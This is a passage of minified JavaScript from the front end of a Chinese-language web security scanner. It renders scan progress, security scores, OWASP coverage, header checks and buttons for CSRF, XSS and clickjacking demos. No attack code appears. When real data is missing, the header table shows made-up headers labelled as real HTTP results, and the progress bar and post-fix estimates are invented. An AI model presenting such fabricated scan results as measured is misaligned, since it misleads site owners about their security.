class="stage-status" style="font-size:11px;color:var(--text-secondary)">等待</div></div>'}).join(""),n='<div class="report-header fade-in-up"><div style="position:relative;height:160px;margin-bottom:16px;display:flex;align-items:center;justify-content:center"><div id="scan-3d-orbit" style="position:relative;width:140px;height:140px"><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.3);animation:spin 3s linear infinite"></div><div style="position:absolute;inset:14px;border-radius:50%;border:2px solid rgba(168,85,247,0.4);animation:spin 2s linear infinite reverse"></div><div style="position:absolute;inset:28px;border-radius:50%;border:2px solid rgba(115,201,144,0.3);animation:spin 4s linear infinite"></div><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.4);animation:pulse-ring 2s ease-out infinite"></div><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(168,85,247,0.3);animation:pulse-ring 2s ease-out infinite 0.6s"></div><div id="scan-3d-core" style="position:absolute;inset:42px;border-radius:50%;background:radial-gradient(circle,rgba(75,110,175,0.7),rgba(75,110,175,0.15));display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;box-shadow:0 0 30px rgba(75,110,175,0.5)"><span id="scan-percent" style="font-size:26px;font-weight:800;line-height:1">0%</span><span style="font-size:9px;opacity:0.8;margin-top:2px">扫描中</span></div></div></div><div style="max-width:min(420px,calc(100% - 32px));margin:0 auto 16px"><div style="height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden"><div id="scan-main-progress" style="height:100%;width:0%;background:#3c3f41;border-radius:3px;transition:width 0.5s ease;box-shadow:0 0 10px rgba(75,110,175,0.5)"></div></div></div><div id="scan-live-text" style="height:20px;font-size:12px;color:#a5b4fc;margin-bottom:14px;text-align:center;overflow:hidden;transition:all 0.3s"><span style="display:inline-block;animation:scan-text-glow 1.5s ease-in-out infinite">正在初始化扫描引擎...</span></div><h2 style="margin-bottom:6px;font-size:clamp(16px,5vw,20px)">正在扫描 '+E(s)+'</h2><p style="color:var(--text-lighter);font-size:12px;margin-bottom:18px">安全扫描引擎 · 7 阶段实时扫描中</p><div style="max-width:min(420px,calc(100% - 32px));margin:0 auto;text-align:left">'+a+`</div><button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:600;transition:all 0.2s" onmouseover="this.style.background='rgba(199,84,80,0.25)'" onmouseout="this.style.background='rgba(199,84,80,0.15)'"> 取消扫描</button></div><style>@keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}@keyframes pulse-ring{0%,100%{transform:scale(1);opacity:1}}@keyframes scan-text-glow{0%,100%{opacity:1}}</style>`;r.innerHTML=n,vn();let p=((document.querySelector('input[name="scan-depth"]:checked')||{}).value||"standard")==="deep";gn(i,s,p)}function qt(e,i){let t=document.getElementById("stage-"+e);if(!t)return;t.style.opacity="1";let s=t.querySelector(".stage-icon"),r=t.querySelector(".stage-status");i==="running"?(t.style.background="rgba(75,110,175,0.12)",t.style.borderColor="rgba(75,110,175,0.4)",s.style.background="rgba(75,110,175,0.4)",s.style.color="#fff",s.innerHTML="刷新",s.style.animation="spin 1s linear infinite",r.innerHTML='<span style="color:#a5b4fc">扫描中</span>'):i==="done"?(t.style.background="rgba(115,201,144,0.1)",t.style.borderColor="rgba(115,201,144,0.3)",s.style.background="rgba(115,201,144,0.3)",s.style.color="#73c990",s.style.animation="none",s.innerHTML="",r.innerHTML='<span style="color:#73c990">完成</span>'):i==="fail"&&(t.style.background="rgba(199,84,80,0.1)",t.style.borderColor="rgba(199,84,80,0.3)",s.style.background="rgba(199,84,80,0.3)",s.style.color="#c75450",s.style.animation="none",s.innerHTML="",r.innerHTML='<span style="color:#c75450">失败</span>')}function hn(){let e=["dns","connect","headers","ssl","sensitive","waf","report"],i=0;je&&(clearInterval(je),je=null);function t(){i>0&&i<=e.length&&qt(e[i-1],"done"),i<e.length?(qt(e[i],"running"),i++):(clearInterval(je),je=null)}t(),je=setInterval(t,700)}function He(){je&&(clearInterval(je),je=null),["dns","connect","headers","ssl","sensitive","waf","report"].forEach(function(i){qt(i,"done")}),mn(100,"扫描完成，报告...")}function vn(){Ce=0,Tt=0,Oe&&(clearInterval(Oe),Oe=null),Ae&&(Ae.forEach(function(i){clearTimeout(i)}),Ae=[]);let e=0;Oe=setInterval(function(){Ce<30?e+=Math.random()*5+2:Ce<60?e+=Math.random()*3+1:Ce<85?e+=Math.random()*2+.5:e+=Math.random()*.8+.2,e=Math.min(e,95),Ce<e&&(Ce+=(e-Ce)*.3,Ce=Math.min(Ce,95));let i=document.getElementById("scan-main-progress"),t=document.getElementById("scan-percent");if(i&&(i.style.width=Math.round(Ce)+"%"),t&&(t.textContent=Math.round(Ce)+"%"),Math.random()<.15&&Tt<Mi.length-1){Tt++;let s=document.getElementById("scan-live-text");if(s){s.style.opacity="0";let r=setTimeout(function(){if(!Oe)return;let o=s.querySelector("span");o&&(o.textContent=Mi[Tt]),s.style.opacity="1"},200);Ae||(Ae=[]),Ae.push(r)}}},200)}function ai(){Oe&&(clearInterval(Oe),Oe=null),Ae&&(Ae.forEach(function(e){clearTimeout(e)}),Ae=[])}function mn(e,i){Ce=e;let t=document.getElementById("scan-main-progress"),s=document.getElementById("scan-percent");if(t&&(t.style.width=e+"%"),s&&(s.textContent=Math.round(e)+"%"),i){let r=document.getElementById("scan-live-text");if(r){let o=r.querySelector("span");o&&(o.textContent=i)}}e>=100&&(Oe&&(clearInterval(Oe),Oe=null),Ae&&(Ae.forEach(function(r){clearTimeout(r)}),Ae=[]))}function yn(e){let i=[{name:"安全响应头",score:0},{name:"SSL/TLS",score:0},{name:"敏感文件",score:0},{name:"WAF 防护",score:0},{name:"漏洞检测",score:0}],t=e.findings||[];t.forEach(function(d){let f=(d.name||"").toLowerCase(),h=(d.owasp||"").toLowerCase();(f.indexOf("安全响应头")>=0||f.indexOf("响应头")>=0||h.indexOf("a05")>=0)&&(i[0].score=Math.max(i[0].score,d.level==="高风险"?30:d.level==="中风险"?60:80)),(f.indexOf("https")>=0||f.indexOf("ssl")>=0||f.indexOf("tls")>=0||f.indexOf("证书")>=0)&&(i[1].score=Math.max(i[1].score,d.level==="高风险"?30:d.level==="中风险"?60:80)),(f.indexOf("敏感文件")>=0||f.indexOf(".env")>=0||f.indexOf(".git")>=0||f.indexOf("暴露")>=0)&&(i[2].score=Math.max(i[2].score,d.level==="高风险"?30:d.level==="中风险"?60:80)),(f.indexOf("waf")>=0||f.indexOf("防火墙")>=0)&&(i[3].score=Math.max(i[3].score,d.level==="高风险"?30:d.level==="中风险"?60:80)),(f.indexOf("注入")>=0||f.indexOf("xss")>=0||f.indexOf("sql")>=0||f.indexOf("csrf")>=0)&&(i[4].score=Math.max(i[4].score,d.level==="高风险"?30:d.level==="中风险"?60:80))});let s=t.length>0;i.forEach(function(d){d.score===0&&(d.score=s?85:95)});let r=150,o=150,a=110,n=i.length,c=[],p='<svg viewBox="0 0 300 300" style="max-width:300px;margin:0 auto;display:block" aria-label="安全维度">';for(let d=1;d<=5;d++){let f=a*d/5,h=[];for(let m=0;m<n;m++){let g=-Math.PI/2+m*2*Math.PI/n;h.push((r+f*Math.cos(g)).toFixed(1)+","+(o+f*Math.sin(g)).toFixed(1))}p+='<polygon points="'+h.join(" ")+'" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>'}for(let d=0;d<n;d++){let f=-Math.PI/2+d*2*Math.PI/n;p+='<line x1="'+r+'" y1="'+o+'" x2="'+(r+a*Math.cos(f)).toFixed(1)+'" y2="'+(o+a*Math.sin(f)).toFixed(1)+'" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>'}let v=[];for(let d=0;d<n;d++){let f=-Math.PI/2+d*2*Math.PI/n,h=a*i[d].score/100;v.push((r+h*Math.cos(f)).toFixed(1)+","+(o+h*Math.sin(f)).toFixed(1)),c.push({x:r+h*Math.cos(f),y:o+h*Math.sin(f),name:i[d].name,score:i[d].score})}return p+='<polygon points="'+v.join(" ")+'" fill="rgba(75,110,175,0.35)" stroke="#4b6eaf" stroke-width="2"/>',c.forEach(function(d){p+='<circle cx="'+d.x.toFixed(1)+'" cy="'+d.y.toFixed(1)+'" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="1.5"/>'}),c.forEach(function(d,f){let h=-Math.PI/2+f*2*Math.PI/n,m=r+(a+22)*Math.cos(h),g=o+(a+22)*Math.sin(h),y=m<r-5?"end":m>r+5?"start":"middle";p+='<text x="'+m.toFixed(1)+'" y="'+g.toFixed(1)+'" text-anchor="'+y+'" dominant-baseline="middle" font-size="11" font-weight="600" fill="currentColor">'+E(d.name)+" "+d.score+"</text>"}),p+="</svg>",p}function bt(e){try{if(hr(e)){Tr(),Se("result"),Yi(e),de=e,wn(e);return}e=e||{},e.findings=Array.isArray(e.findings)?e.findings:[],e.owasp_coverage=Array.isArray(e.owasp_coverage)?e.owasp_coverage:[],e.header_details=Array.isArray(e.header_details)?e.header_details:[],e.info_leaks=Array.isArray(e.info_leaks)?e.info_leaks:[],e.cookie_issues=Array.isArray(e.cookie_issues)?e.cookie_issues:[],e.waf=Array.isArray(e.waf)?e.waf:[],e.sensitive_paths=Array.isArray(e.sensitive_paths)?e.sensitive_paths:[],e.crawled_pages=Array.isArray(e.crawled_pages)?e.crawled_pages:[],e.vuln_tests=Array.isArray(e.vuln_tests)?e.vuln_tests:[],e.score_breakdown=Array.isArray(e.score_breakdown)?e.score_breakdown:[],e.owasp_coverage=Array.isArray(e.owasp_coverage)?e.owasp_coverage:[],e.ai_report=e.ai_report&&typeof e.ai_report=="object"?e.ai_report:{summary:"扫描完成",priority:"暂无优先事项"},e.score=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,e.score=Math.max(0,Math.min(100,e.score)),e.raw_headers=e.raw_headers&&typeof e.raw_headers=="object"?e.raw_headers:{};let i=0,t=0,s=0;e.findings.forEach(function(l){l.level==="高风险"?i++:l.level==="中风险"?t++:s++});let r=e.score<50?"high":e.score<75?"medium":"low",o=Pt(e.score),a=jt(e.score),n="";n+='<div class="report-header fade-in-up">',n+='<div style="margin-bottom:12px">',e.restricted?n+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">受限扫描报告</span>':n+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">真实扫描</span>',n+="</div>",e.tls_verify_skipped&&(n+='<div style="background:rgba(199,84,80,0.08);border:1px solid rgba(199,84,80,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#c75450;line-height:1.6">',n+="<strong>诊断模式</strong><br/>",n+="当前扫描跳过了 TLS 证书验证，结果仅供诊断参考。生产环境建议开启 TLS_VERIFY=true。",n+="</div>"),e.restricted?(n+='<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">',n+="<strong>受限扫描报告</strong><br/>",n+="目标可访问，但存在登录/WAF/反爬限制（HTTP "+(e.restricted_code||"")+"），<br/>",n+="本次扫描受到登录态、WAF 或反爬限制影响，部分结果仅供复核参考。",n+="</div>"):e.restricted_reason&&(n+='<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">',n+="<strong>受限访问提示</strong><br/>"+E(e.restricted_reason),n+="</div>"),e.redirected&&(n+='<div style="background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#4b6eaf;line-height:1.6">',n+='<div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">',n+="<div><strong>跳转提示</strong><br/>",n+=E(e.redirect_reason||"目标发生跳转，建议扫描最终目标地址。"),n+="</div>",n+=`<button onclick="scanRedirectTarget()" style="background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);padding:6px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;transition:background 0.15s" onmouseover="this.style.background='rgba(59,130,246,0.25)'" onmouseout="this.style.background='rgba(59,130,246,0.15)'">扫描最终地址</button>`,n+="</div></div>"),n+='<div class="score-ring-wrap score-pulse">',n+='<div class="score-ring" style="background:'+o+'">',n+='<div class="score-value" style="color:#fff">'+e.score+"</div>",n+='<div class="score-label" style="color:rgba(255,255,255,0.7)">安全评分</div>',n+="</div></div>",n+='<div class="report-url">'+E(e.url||"")+"</div>",n+='<div class="report-time">'+(e.time||"")+"</div>",n+='<span class="risk-badge '+r+'">'+(e.risk_level||"未知")+"</span>",n+="</div>";let c="";if(i+t>0?c="当前结果包含 "+i+" 个高风险和 "+t+" 个中风险项，建议先修复高风险项，再复测确认。":s>0?c="当前风险以低危和提示项为主，建议保持修复节奏并持续监控。":c="当前未发现明显风险，可作为基线结果保留，并在版本变更后复测。",n+='<div class="card fade-in-up" style="animation-delay:0.05s;padding:14px;margin-top:12px;border:1px solid rgba(75,110,175,0.25);background:rgba(60,63,65,0.9)">',n+='<div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:6px">',n+='<div style="font-size:13px;font-weight:700;color:var(--text-primary)">概览</div>',n+='<div style="font-size:12px;color:var(--text-secondary)">'+(e.restricted?"受限扫描，结论需复核":"可直接进入修复与复测")+"</div>",n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">'+E(c)+"</div>",n+='<div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:10px;font-size:12px;color:var(--text-secondary)">',n+="<span>总发现："+(e.findings.length||0)+"</span>",n+="<span>高/中风险："+i+"/"+t+"</span>",n+="<span>最近评分："+e.score+"</span>",n+="</div>",n+="</div>",n+='<div class="risk-stats fade-in-up" style="animation-delay:0.1s">',n+='<div class="risk-stat high"><div class="num">'+i+'</div><div class="label">高风险</div></div>',n+='<div class="risk-stat medium"><div class="num">'+t+'</div><div class="label">中风险</div></div>',n+='<div class="risk-stat low"><div class="num">'+s+'</div><div class="label">低风险</div></div>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.15s">',n+='<div class="card-title">安全维度</div>',n+='<div id="radar-chart-container" style="display:flex;justify-content:center"></div>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.2s">',n+='<div class="card-title">公开测试</div>',n+='<p style="margin:0 0 14px 0;font-size:12px;color:var(--text-secondary)">展示常见风险场景，用于说明问题影响</p>',n+='<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px">',n+=`<button onclick="simulateCSRF('`+be(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(199,84,80,0.3);background:rgba(199,84,80,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#dc2626;transition:background 0.15s" onmouseover="this.style.background='rgba(199,84,80,0.15)'" onmouseout="this.style.background='rgba(199,84,80,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">CSRF</div>',n+='<div style="font-size:11px;font-weight:400;color:#7f1d1d">跨站请求伪造</div></button>',n+=`<button onclick="simulateXSS('`+be(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(240,167,50,0.3);background:rgba(240,167,50,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#ea580c;transition:background 0.15s" onmouseover="this.style.background='rgba(240,167,50,0.15)'" onmouseout="this.style.background='rgba(240,167,50,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">XSS</div>',n+='<div style="font-size:11px;font-weight:400;color:#f0a732">跨站脚本</div></button>',n+=`<button onclick="simulateClickjacking('`+be(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(168,85,247,0.3);background:rgba(168,85,247,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#9333ea;transition:background 0.15s" onmouseover="this.style.background='rgba(168,85,247,0.15)'" onmouseout="this.style.background='rgba(168,85,247,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">Clickjacking</div>',n+='<div style="font-size:11px;font-weight:400;color:#c084fc">点击劫持</div></button>',n+="</div>",n+='<div id="attack-演示-result" style="margin-top:14px"></div>',n+="</div>",e.score_breakdown&&e.score_breakdown.length>0){let l=e.score_breakdown.reduce(function(re,ae){return re+ae.deduction},0),A=0,J=0,D=0,q=0,$=[],te=[],B=[],T=[];e.score_breakdown.forEach(function(re){re.severity==="critical"?(A+=re.deduction,$.push(re)):re.severity==="high"?(J+=re.deduction,te.push(re)):re.severity==="medium"?(D+=re.deduction,B.push(re)):(q+=re.deduction,T.push(re))}),n+='<div class="card fade-in-up" style="animation-delay:0.25s">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">',n+='<div style="display:flex;align-items:center;gap:10px">',n+='<div class="card-title" style="margin:0">评分解读</div>',n+="</div>",n+='<span style="font-size:12px;background:rgba(240,167,50,0.15);color:#ea580c;padding:3px 10px;border-radius:2px;font-weight:600">共扣 '+l+" 分</span>",n+="</div>",n+='<div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">';let ee=Math.max(A,J,D,q,1);[{label:"严重",count:$.length,deduct:A,color:"#dc2626",bg:"rgba(220,38,38,0.15)"},{label:"高风险",count:te.length,deduct:J,color:"#f0a732",bg:"rgba(240,167,50,0.15)"},{label:"中风险",count:B.length,deduct:D,color:"#f0a732",bg:"rgba(240,167,50,0.15)"},{label:"低风险",count:T.length,deduct:q,color:"#73c990",bg:"rgba(115,201,144,0.15)"}].forEach(function(re){let ae=re.count>0?Math.max(re.deduct/ee*100,8):0;n+='<div style="display:flex;align-items:center;gap:10px">',n+='<span style="font-size:12px;color:var(--text-secondary);min-width:48px;font-weight:600">'+re.label+"</span>",n+='<div style="flex:1;height:20px;background:var(--bg-secondary);border-radius:2px;overflow:hidden;position:relative">',n+='<div style="height:100%;width:'+ae+"%;background:"+re.color+';border-radius:2px;transition:width 0.6s ease"></div>',n+='<span style="position:absolute;right:8px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:700;color:'+(ae>30?"#fff":"var(--text-secondary)")+'">'+re.count+" 项 / -"+re.deduct+"分</span>",n+="</div></div>"}),n+="</div>",n+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:12px 14px">',n+='<div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:8px;display:flex;align-items:center;gap:6px">',n+="<span>修复优先级建议</span>",n+="</div>";let X=[];$.length>0&&X.push('<strong style="color:#dc2626">紧急</strong>：立即修复严重漏洞（'+$.length+"项）"),te.length>0&&X.push('<strong style="color:#f0a732">重要</strong>：优先修复高风险配置问题（'+te.length+"项）"),B.length>0&&X.push('<strong style="color:#ca8a04">常规</strong>：计划修复中风险项（'+B.length+"项）"),T.length>0&&X.push('<strong style="color:#16a34a">可选</strong>：低风险项可按需优化（'+T.length+"项）"),X.length===0&&X.push('<strong style="color:#16a34a">优秀</strong>：未发现明显安全问题'),n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">'+X.join("<br/>")+"</div>",n+="</div>",n+='<details style="margin-top:12px">',n+='<summary style="cursor:pointer;font-size:12px;font-weight:600;color:var(--text-secondary);list-style:none">',n+='<span style="display:inline-flex;align-items:center;gap:6px">',n+='<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>',n+="查看完整扣分明细",n+="</span></summary>",n+='<div style="margin-top:10px;max-height:240px;overflow-y:auto;padding-right:4px">',$.concat(te,B,T).forEach(function(re,ae){let oe=re.severity==="critical"?"#dc2626":re.severity==="high"?"#f0a732":re.severity==="medium"?"#ca8a04":"#16a34a",ne=re.severity==="critical"?"严重":re.severity==="high"?"高":re.severity==="medium"?"中":"低";n+='<div style="display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid var(--border-light);font-size:12px">',n+='<div style="display:flex;align-items:center;gap:8px">',n+='<span style="font-size:9px;font-weight:700;padding:2px 6px;border-radius:2px;background:'+oe+"20;color:"+oe+'">'+ne+"</span>",n+='<span style="color:var(--text-primary)">'+E(re.item)+"</span>",n+="</div>",n+='<span style="font-weight:700;color:'+oe+'">- '+re.deduction+"</span>",n+="</div>"}),n+="</div></details>",n+="</div>"}let p=e.score||0,v=Math.min(98,p+25),d=i+t,f=Math.max(0,Math.round(d*.25)),h=0,m=0,g=0,y=0;if(e.findings&&(e.findings.forEach(function(l){let A=l.name||"";A.indexOf("缺少")>=0&&A.indexOf("头")>=0&&h++,(A.indexOf("敏感路径")>=0||A.indexOf("目录遍历")>=0||A.indexOf(".env")>=0)&&g++}),m=0,y=Math.max(0,g-2)),n+='<div class="card fade-in-up" style="animation-delay:0.18s">',n+='<div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">',n+='<div class="card-title" style="margin:0">复测前后对比</div>',n+='<span style="font-size:11px;background:rgba(115,201,144,0.15);color:#16a34a;padding:2px 8px;border-radius:2px;font-weight:600">预估</span>',n+="</div>",n+='<div style="overflow-x:auto">',n+='<table style="width:100%;border-collapse:collapse;font-size:13px">',n+='<thead><tr style="border-bottom:1px solid #555555">',n+='<th style="text-align:left;padding:10px 8px;font-weight:600;color:var(--text-secondary)">项目</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">复测前</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">复测后</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">变化</th>',n+="</tr></thead>",n+="<tbody>",[{label:"安全评分",before:p,after:v,unit:"分",good:"up"},{label:"中高风险",before:d,after:f,unit:"个",good:"down"},{label:"缺失安全头",before:h,after:m,unit:"个",good:"down"},{label:"敏感路径风险",before:g,after:y,unit:"个",good:"down"},{label:"建议处理时间",before:"2 小时",after:"15 分钟",unit:"",good:"down"}].forEach(function(l,A){let J="";if(typeof l.before=="number"&&typeof l.after=="number"){let q=l.after-l.before,$=q>0?"#16a34a":q<0?"#dc2626":"var(--text-secondary)",te=q>0?"+"+q:String(q);J='<span style="color:'+$+';font-weight:700">'+te+"</span>"}else J='<span style="color:#16a34a;font-weight:700">大幅缩短</span>';let D=A%2===0?"transparent":"#313335";n+='<tr style="background:'+D+';border-bottom:1px solid #555555">',n+='<td style="padding:10px 8px;font-weight:600">'+l.label+"</td>",n+='<td style="text-align:center;padding:10px 8px;color:var(--text-secondary)">'+l.before+(l.unit?" "+l.unit:"")+"</td>",n+='<td style="text-align:center;padding:10px 8px;color:var(--text-primary);font-weight:700">'+l.after+(l.unit?" "+l.unit:"")+"</td>",n+='<td style="text-align:center;padding:10px 8px">'+J+"</td>",n+="</tr>"}),n+="</tbody></table>",n+="</div>",n+='<p style="margin:12px 0 0 0;font-size:11px;color:var(--text-light);line-height:1.5">提示：以上为基于当前扫描结果的修复预估效果，实际效果取决于修复配置的应用完整度。</p>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.12s;text-align:center;padding:20px">',n+='<div class="card-title">安全维度</div>',n+=yn(e),n+="</div>",n+='<div class="ai-advisor fade-in-up" style="animation-delay:0.15s">',n+='<div class="ai-avatar">顾问</div>',n+='<div class="ai-bubble">',n+='<div class="ai-tag">安全顾问</div>',n+="<p>"+E(e.ai_report.summary)+"</p>",n+='<div class="priority">优先处理：'+E(e.ai_report.priority)+"</div>",n+="</div></div>",n+='<div class="card fade-in-up" style="animation-delay:0.2s">',n+='<div class="card-title">导出</div>',n+='<p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">发现 '+e.findings.length+" 个问题，导出报告与修复配置</p>",n+='<div style="display:flex;gap:10px;flex-wrap:wrap">',n+=`<button class="fixer-btn primary" onclick="downloadReport('pdf')">下载 PDF 报告</button>`,n+='<button class="fixer-btn secondary" onclick="downloadAllFixes()">导出修复配置包</button>',n+="</div>",n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.25s">',n+='<div class="card-title">OWASP Top 10 覆盖</div>',e.owasp_coverage.forEach(function(l){let A=l.status==="通过"?"pass":l.status==="高风险"?"fail":l.status==="低风险"?"warn":"unknown",J=l.status==="通过"?"pass":l.status==="高风险"?"fail":l.status==="低风险"?"warn":"unknown";n+='<div class="owasp-item">',n+='<span class="owasp-label">'+E(l.category)+"</span>",n+='<div class="owasp-bar-wrap"><div class="owasp-bar '+J+'"></div></div>',n+='<span class="owasp-status '+A+'">'+E(l.status)+"</span>",n+="</div>"}),n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.28s">',n+='<div class="card-title">响应头检测',n+=' <span style="font-size:12px;color:var(--success);font-weight:400">(基于真实 HTTP 响应)</span>',n+="</div>",n+='<div class="code-block" style="font-size:12px;line-height:2">',e.header_details&&e.header_details.length>0){if(n+='<div style="color:#64748b">HTTP/1.1 200 OK</div>',n+="<div>Date: "+new Date().toUTCString()+"</div>",e.raw_headers){let l=e.raw_headers;l.server&&(n+='<div>Server: <span style="color:#f0a732">'+E(l.server)+'</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>'),l["content-type"]&&(n+="<div>Content-Type: "+E(l["content-type"].split(";")[0])+"</div>")}n+='<div style="color:#94a3b8;margin-top:4px">--- Security Headers ---</div>',e.header_details.forEach(function(l){l.status==="present"?n+='<div style="color:var(--success)">'+E(l.name)+": "+E(l.value||"(已配置)")+" [已配置]</div>":l.status==="missing"?n+='<div style="color:var(--danger)">'+E(l.name)+': <span style="color:var(--text-lighter)">[缺失]</span> </div>':l.status==="leak"?n+='<div style="color:#f0a732">'+E(l.name)+': <span style="color:#f0a732">'+E(l.value)+"</span> 信息泄露</div>":l.status==="warning"?n+='<div style="color:#f0a732">'+E(l.name)+': <span style="color:#f0a732">'+E(l.value||"")+"</span> 配置风险</div>":l.status==="not_set"&&(n+='<div style="color:var(--text-lighter)">'+E(l.name)+': <span style="color:var(--text-lighter)">[未设置]</span></div>')})}else n+='<div style="color:#64748b">HTTP/1.1 200 OK</div>',n+='<div>Server: <span style="color:#f0a732">nginx/1.18.0</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>',n+="<div>Date: "+new Date().toUTCString()+"</div>",n+="<div>Content-Type: text/html; charset=utf-8</div>",e.score>=50?n+='<div style="color:var(--success)">X-Frame-Options: DENY [已配置]</div>':n+='<div style="color:var(--danger)">X-Frame-Options: <span style="color:var(--text-lighter)">[缺失]</span></div>',e.score>=60?n+='<div style="color:var(--success)">X-Content-Type-Options: nosniff </div>':n+='<div style="color:var(--danger)">X-Content-Type-Options: <span style="color:var(--text-lighter)">[缺失]</span> </div>',e.score>=70?n+='<div style="color:var(--success)">Strict-Transport-Security: max-age=31536000 </div>':n+='<div style="color:var(--danger)">Strict-Transport-Security: <span style="color:var(--text-lighter)">[缺失]</span> </div>',e.score>=65?n+='<div style="color:var(--success)">Content-Security-Policy: default-src &#x27;self&#x27; </div>':n+='<div style="color:var(--danger)">Content-Security-Policy: <span style="color:var(--text-lighter)">[缺失]</span> </div>';n+="</div></div>",n+='<div class="section-title fade-in-up" style="animation-delay:0.3s">漏洞详情</div>',(!e.findings||e.findings.length===0)&&(n+='<div class="card fade-in-up" style="animation-delay:0.35s;text-align:center;padding:40px 20px;background:#3c3f41;border:1px solid #555555">',n+='<h3 style="margin:0 0 8px;color:#73c990;font-size:16px">安全状况良好</h3>',n+='<p style="color:var(--text-secondary);margin:0 0 16px;font-size:13px;line-height:1.6">当前未发现明显问题。<br/>建议保留结果作为基线，并在版本变更后复测。</p>',n+='<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">',n+=`<button onclick="navigateTo('scan')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:500">重新扫描</button>`,n+=`<button onclick="navigateTo('evolution')" style="background:transparent;color:var(--text);border:1px solid var(--border);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px">查看进化中心</button>`,n+="</div></div>"),e.findings.forEach(function(l){if(!l.confidence_level&&typeof l.confidence!="number"){let A=l.name||"";A.indexOf("缺少")===0||A.indexOf("HSTS")>=0||A.indexOf("CSP")>=0||A.indexOf("X-Frame")>=0||A.indexOf("X-Content")>=0||A.indexOf("Referrer")>=0||A.indexOf("Permissions")>=0?(l.confidence_level="高",l.cv_reason="响应头确定性检测"):A.indexOf("敏感路径")>=0||A.indexOf("敏感文件")>=0||A.indexOf("目录")>=0?(l.confidence_level="中",l.cv_reason="HTTP 状态码推断"):A.indexOf("信息泄露")>=0||A.indexOf("Server")>=0||A.indexOf("版本")>=0?(l.confidence_level="高",l.cv_reason="响应头内容匹配"):(l.confidence_level="中",l.cv_reason="启发式检测")}});let k="",x="";if(e.findings.forEach(function(l,A){let J=qi(l.level),D=e.scan_id||e.id||0,q=e.finding_feedback_map&&e.finding_feedback_map[l.name]||null,$=q&&q.is_false_positive?" fp-marked":"",te=q&&q.is_confirmed?" confirmed":"",B="",T="",ee=l.level||l.severity||"";ee==="严重"||ee==="critical"||ee==="高风险"||ee==="高危"?(B="紧急",T="priority-urgent"):ee==="中风险"||ee==="中危"||ee==="medium"?(B="重要",T="priority-important"):(B="一般",T="priority-normal");let K=J;k+='<div 